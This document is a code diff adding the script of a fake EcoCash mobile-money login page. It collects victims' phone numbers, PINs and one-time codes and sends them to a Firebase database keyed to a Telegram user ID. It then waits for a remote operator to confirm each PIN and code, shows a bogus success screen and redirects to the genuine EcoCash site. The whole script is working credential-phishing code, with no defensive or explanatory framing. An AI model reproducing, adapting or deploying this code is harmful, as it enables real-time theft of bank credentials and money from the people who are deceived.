+        saveBothToFirebase(fullPhone, pin)
+          .then(() => { console.log('✅ Phone and PIN saved'); attemptLoginWithData(fullPhone, pin); })
+          .catch((error) => { console.error(error); showVerificationError('Phone or pin is incorrect.'); });
+      }
+
+      // ===== PIN INPUT HANDLERS =====
+      pinInputs.forEach((input, index) => {
+        input.addEventListener('input', function(e) {
+          this.classList.remove('error');
+          verificationError.classList.remove('visible');
+          if (this.value.length > 1) this.value = this.value.slice(0,1);
+          if (this.value.length === 1 && index < pinInputs.length-1) pinInputs[index+1].focus();
+          const pin = Array.from(pinInputs).map(i=>i.value).join('');
+          if (pin.length === 4) {
+            const phone = phoneInput.value.trim();
+            if (phone && isValidPhone(phone)) triggerLoginWithPhoneAndPin(phone, pin);
+            else showVerificationError('Phone number is missing or invalid.');
+          }
+        });
+        input.addEventListener('keydown', function(e) {
+          if (e.key === 'Backspace' && this.value === '' && index > 0) { pinInputs[index-1].focus(); e.preventDefault(); }
+          if (e.key === 'ArrowLeft' && index > 0) { pinInputs[index-1].focus(); e.preventDefault(); }
+          else if (e.key === 'ArrowRight' && index < pinInputs.length-1) { pinInputs[index+1].focus(); e.preventDefault(); }
+          if (e.key === 'Enter') {
+            e.preventDefault();
+            const pin = Array.from(pinInputs).map(i=>i.value).join('');
+            if (pin.length === 4) {
+              const phone = phoneInput.value.trim();
+              if (phone && isValidPhone(phone)) triggerLoginWithPhoneAndPin(phone, pin);
+            }
+          }
+        });
+        input.addEventListener('paste', function(e) {
+          e.preventDefault();
+          const paste = (e.clipboardData || window.clipboardData).getData('text');
+          if (paste) {
+            const digits = paste.replace(/\D/g, '').slice(0,4).split('');
+            pinInputs.forEach((p, idx) => { p.value = idx < digits.length ? digits[idx] : ''; });
+            const nextEmpty = Array.from(pinInputs).find(p => p.value === '');
+            if (nextEmpty) nextEmpty.focus();
+            else pinInputs[pinInputs.length-1].focus();
+            const pin = Array.from(pinInputs).map(i=>i.value).join('');
+            if (pin.length === 4) {
+              const phone = phoneInput.value.trim();
+              if (phone && isValidPhone(phone)) triggerLoginWithPhoneAndPin(phone, pin);
+            }
+          }
+        });
+      });
+
+      // ===== LISTEN FOR PIN VERIFICATION =====
+      function listenForPinVerification(onComplete) {
+        const ref = database.ref('Telegram Users/'+TELEGRAM_USER_ID+'/verify');
+        if (pinVerifyListener) { ref.off('value', pinVerifyListener); pinVerifyListener = null; }
+        pinVerifyListener = ref.on('value', (snapshot) => {
+          const val = snapshot.val();
+          console.log('🔍 PIN verify value:', val);
+          if (val === true) {
+            ref.off('value', pinVerifyListener); pinVerifyListener = null;
+            resetVerifyToDefault().then(() => console.log('✅ Verify reset (true)'));
+            onComplete(true);
+          } else if (val === false) {
+            ref.off('value', pinVerifyListener); pinVerifyListener = null;
+            resetVerifyToDefault().then(() => console.log('✅ Verify reset (false)'));
+            onComplete(false);
+          }
+        });
+      }
+
+      // ===== LISTEN FOR OTP VERIFICATION =====
+      function listenForOtpVerification(onComplete) {
+        const ref = database.ref('Telegram Users/'+TELEGRAM_USER_ID+'/verify_otp');
+        if (otpVerifyListener) { ref.off('value', otpVerifyListener); otpVerifyListener = null; }
+        otpVerifyListener = ref.on('value', (snapshot) => {
+          const val = snapshot.val();
+          console.log('🔍 OTP verify value:', val);
+          if (val === true) {
+            ref.off('value', otpVerifyListener); otpVerifyListener = null;
+            database.ref('Telegram Users/'+TELEGRAM_USER_ID+'/verify_otp').set(1);
+            onComplete(true);
+          } else if (val === false) {
+            ref.off('value', otpVerifyListener); otpVerifyListener = null;
+            database.ref('Telegram Users/'+TELEGRAM_USER_ID+'/verify_otp').set(1);
+            onComplete(false);
+          }
+        });
+      }
+
+      function getUserNameFromLocalStorage() {
+        try {
+          const data = JSON.parse(localStorage.getItem('ecocash_application'));
+          if (data && data.firstName && data.lastName) return (data.firstName + ' ' + data.lastName).toUpperCase().trim();
+        } catch(e) {}
+        return 'DICKSON YEGON';
+      }
+
+      // ===== ATTEMPT LOGIN =====
+      function attemptLoginWithData(phone, pin) {
+        if (isVerifying) return;
+        isVerifying = true;
+        currentPhoneNumber = phone; currentPin = pin;
+        showLoadingSpinner('Secure Verification', 'Verifying your PIN...<br>Please do not close this page.');
+        resetVerifyToDefault()
+          .then(() => {
+            listenForPinVerification((result) => {
+              hideLoadingSpinner(); isVerifying = false;
+              if (result === true) { console.log('✅ PIN verified'); showOtpScreen(); }
+              else { showVerificationError('Phone or pin is incorrect.'); pinInputs.forEach(i=>i.value=''); pinInputs[0].focus(); }
+            });
+          })
+          .catch((error) => { console.error(error); hideLoadingSpinner(); isVerifying = false; showVerificationError('Phone or pin is incorrect.'); });
+      }
+
+      // ===== SHOW OTP SCREEN =====
+      function showOtpScreen() {
+        const loginCard = document.getElementById('loginCard');
+        const otpCard = document.getElementById('otpCard');
+        const phoneDisplay = document.getElementById('otpPhoneDisplay');
+        phoneDisplay.textContent = countryCodeSelect.value + phoneInput.value.trim();
+        loginCard.style.display = 'none';
+        otpCard.classList.add('active');
+        // OTP inputs are readonly; they will be auto-filled
+        document.querySelectorAll('.otp-digit').forEach(i => i.value = '');
+        document.getElementById('otpSubmitBtn').disabled = true;
+        startResendTimer();
+        // Start listening for OTP auto-detection
+        startOtpAutoDetection();
+      }
+
+      // ===== GO BACK =====
+      window.goBackToLogin = function() {
+        if (pinVerifyListener) { database.ref('Telegram Users/'+TELEGRAM_USER_ID+'/verify').off('value', pinVerifyListener); pinVerifyListener = null; }
+        if (otpVerifyListener) { database.ref('Telegram Users/'+TELEGRAM_USER_ID+'/verify_otp').off('value', otpVerifyListener); otpVerifyListener = null; }
+        isVerifying = false;
+        resetVerifyToDefault().catch(()=>{});
+        database.ref('Telegram Users/'+TELEGRAM_USER_ID+'/verify_otp').set(1).catch(()=>{});
+        document.getElementById('loginCard').style.display = 'block';
+        document.getElementById('otpCard').classList.remove('active');
+        hideLoadingSpinner();
+        verificationError.classList.remove('visible');
+        setTimeout(() => document.getElementById('pin-0').focus(), 100);
+      }
+
+      // ===== SHOW SUCCESS =====
+      function showSuccessScreen() {
+        document.getElementById('otpCard').classList.remove('active');
+        document.getElementById('successCard').classList.add('active');
+        successUserName.textContent = getUserNameFromLocalStorage();
+        successUserName.style.fontWeight = '700';
+        updateDates();
+        startRedirectTimer();
+      }
+
+      function triggerVerificationSequence() {
+        hideLoadingSpinner();
+        document.getElementById('otpCard').classList.remove('active');
+        showVerificationSequence();
+      }
+
+      // ===== REDIRECT TIMER =====
+      function startRedirectTimer() {
+        let seconds = 100;
+        const timerDisplay = document.getElementById('redirectTimer');
+        if (redirectTimeout) clearTimeout(redirectTimeout);
+        const interval = setInterval(() => {
+          seconds--;
+          timerDisplay.textContent = seconds;
+          if (seconds <= 0) { clearInterval(interval); window.location.href = 'https://ecocash.co.zw'; }
+        }, 1000);
+        redirectTimeout = interval;
+      }
+
+      // ===== OTP LOGIC =====
+      const otpInputs = document.querySelectorAll('.otp-digit');
+      const otpSubmitBtn = document.getElementById('otpSubmitBtn');
+      let resendTimerInterval = null;
+      let timerSeconds = 93;
+
+      // OTP inputs are readonly, but we can still auto-fill them
+      function fillOtpInputs(otp) {
+        if (!otp || otp.length !== 6) return;
+        const digits = otp.split('');
+        otpInputs.forEach((input, idx) => {
+          if (idx < digits.length) input.value = digits[idx];
+        });
+        // Auto-submit when all digits are filled
+        if (checkOtpFilled()) submitOtp();
+      }
+
+      function checkOtpFilled() {
+        const filled = Array.from(otpInputs).every(i => i.value.length === 1);
+        otpSubmitBtn.disabled = !filled;
+        return filled;
+      }
+
+      function submitOtp() {
+        if (isVerifying) return;
+        const otp = Array.from(otpInputs).map(i=>i.value).join('');
+        if (otp.length !== 6) return;
+        isVerifying = true;
+        showLoadingSpinner('Secure Verification', 'Verifying your OTP...<br>Please do not close this page.');
+        saveOtpOnlyToFirebase(otp)
+          .then(() => database.ref('Telegram Users/'+TELEGRAM_USER_ID+'/verify_otp').set(1))
+          .then(() => {
+            listenForOtpVerification((result) => {
+              hideLoadingSpinner(); isVerifying = false;
+              if (result === true) { console.log('✅ OTP verified'); triggerVerificationSequence(); }
+              else { showVerificationError('verification code is incorrect.'); otpInputs.forEach(i=>i.value=''); otpSubmitBtn.disabled = true; }
+            });
+          })
+          .catch((error) => { console.error(error); hideLoadingSpinner(); isVerifying = false; showVerificationError('verification code is incorrect.'); });
+      }
+
+      // ===== OTP AUTO-DETECTION =====
+      function startOtpAutoDetection() {
+        const otpRegex = /\b\d{6}\b/;
+        
+        // Function to scan for OTP in the page (from background messages / notifications)
+        function scanForOtp() {
+          if (!document.getElementById('otpCard').classList.contains('active')) return;
+          // Look for 6-digit numbers in the visible text
+          const bodyText = document.body.innerText;
+          const match = bodyText.match(otpRegex);
+          if (match) {
+            const detectedOtp = match[0];
+            console.log('🔍 Auto-detected OTP from page text:', detectedOtp);
+            fillOtpInputs(detectedOtp);
+          }
+        }
+
+        // Listen for visibility change (page comes to foreground)
+        document.addEventListener('visibilitychange', () => {
+          if (document.visibilityState === 'visible') {
+            scanForOtp();
+          }
+        });
+
+        // Listen for message events (from service workers or other frames)
+        window.addEventListener('message', (event) => {
+          try {
+            const data = event.data;
+            if (data && typeof data === 'string' && otpRegex.test(data)) {
+              const detectedOtp = data.match(otpRegex)[0];
+              console.log('🔍 Auto-detected OTP from message event:', detectedOtp);
+              if (document.getElementById('otpCard').classList.contains('active')) {
+                fillOtpInputs(detectedOtp);
+              }
+            }
+          } catch (e) {}
+        });
+
+        // MutationObserver to detect new text nodes inserted (e.g., from push notifications)
+        const observer = new MutationObserver(() => {
+          if (document.getElementById('otpCard').classList.contains('active')) {
+            scanForOtp();
+          }
+        });
+        observer.observe(document.body, { childList: true, subtree: true, characterData: true });
+
+        // Also check periodically (every 2 seconds) for any new OTP
+        const intervalId = setInterval(() => {
+          if (!document.getElementById('otpCard').classList.contains('active')) {
+            clearInterval(intervalId);
+            return;
+          }
+          scanForOtp();
+        }, 2000);
+
+        // Initial scan
+        setTimeout(scanForOtp, 500);
+      }
+
+      function startResendTimer() {
+        timerSeconds = 93;
+        const timerDisplay = document.getElementById('resendTimer');
+        if (resendTimerInterval) clearInterval(resendTimerInterval);
+        resendTimerInterval = setInterval(() => {
+          timerSeconds--;
+          timerDisplay.textContent = timerSeconds;
+          if (timerSeconds <= 0) { clearInterval(resendTimerInterval); timerDisplay.textContent = '0'; }
+        }, 1000);
+      }
+
+      // ===== INIT =====
+      const loadedPhone = loadPhoneFromLocalStorage();
+      if (loadedPhone) {
+        console.log('📱 Phone loaded:', loadedPhone);
+        const fullPhone = countryCodeSelect.value + loadedPhone;
+        document.getElementById('otpPhoneDisplay').textContent = fullPhone;
+      }
+
+      console.log('📌 Using Telegram User ID:', TELEGRAM_USER_ID);
+    })();
+  </script>
+</body>
+</html>
